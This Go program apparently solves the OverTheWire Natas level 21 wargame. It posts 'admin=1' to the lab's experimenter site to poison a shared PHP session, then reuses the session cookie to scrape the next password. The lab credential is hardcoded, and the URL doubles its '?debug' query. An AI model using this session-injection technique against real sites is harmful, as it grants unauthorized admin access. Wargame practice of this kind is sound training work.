package main

import "fmt"
import "io/ioutil"
import "net/http"
import "net/url"
import "strings"

func getFlag(sessionid string) string {

	var result string = ""

	base_url := "http://natas21.natas.labs.overthewire.org/"

	client := &http.Client{}

	request, _ := http.NewRequest("GET", base_url, nil)
	request.Header.Add("Content-Type", "text/html")
	request.Header.Add("Cookie", "PHPSESSID=" + sessionid)
	request.SetBasicAuth("natas21", "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56")

	response, err1 := client.Do(request)

	if err1 == nil {

		body, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			html := string(body)

			if strings.Contains(html, "Password:") && strings.Contains(html, "</pre") {

				tmp := html[strings.Index(html, "Password:")+9:]
				result = strings.TrimSpace(tmp[0:strings.Index(tmp, "</pre")])

			}

		}

	}

	return result

}

func getPHPSESSID() string {

	var result string = ""

	form_data := url.Values{}
	form_data.Set("align", "center")
	form_data.Set("fontsize", "200%")
	form_data.Set("bgcolor", "red")
	form_data.Set("submit", "Update")
	form_data.Set("debug", "")
	form_data.Set("admin", "1")
	base_url := "http://natas21-experimenter.natas.labs.overthewire.org/?debug"
	real_url := base_url + "?debug"

	client := &http.Client{}

	request, _ := http.NewRequest("POST", real_url, strings.NewReader(form_data.Encode()))
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.SetBasicAuth("natas21", "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56")

	response, err1 := client.Do(request)

	if err1 == nil {

		_, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			cookies := response.Cookies()

			for _, cookie := range cookies {

				value := cookie.String()

				if strings.HasPrefix(value, "PHPSESSID=") {

					if strings.Contains(value, ";") {
						result = strings.TrimSpace(value[10:strings.Index(value, ";")])
					} else {
						result = strings.TrimSpace(value[10:])
					}

				}

			}

		}

	}

	return result

}

func main() {

	session_id := getPHPSESSID()
	flag := getFlag(session_id)

	fmt.Println(flag)

}

